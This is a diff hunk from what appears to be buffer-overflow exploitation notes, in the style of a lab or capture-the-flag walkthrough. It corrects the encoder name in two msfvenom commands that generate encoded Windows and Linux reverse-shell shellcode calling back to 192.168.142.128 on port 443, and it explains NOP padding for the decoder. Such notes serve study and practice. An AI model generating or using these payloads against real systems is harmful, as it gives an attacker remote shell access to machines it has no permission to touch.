@@ -148,8 +148,8 @@ nasm > jmp esp
 ```
 - Generate reverse shell code..  Target system might actually be a Linux running wine (windows emulator)
 ```sh
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86_shikata_ga_nai -b "\x00\x0a\x0d"
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86_shikata_ga_nai -b "\x00\x0a\x0d"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 ```
 - No Operation (NOP) instruction: `\x90`. The metasploit framework decoder will step on its toes by overwriting the first few bytes of the shellcode.. so we need to pad some NOP instruction.. it might be 8 bytes, 10 bytes, 12 bytes, or more.
 ```sh
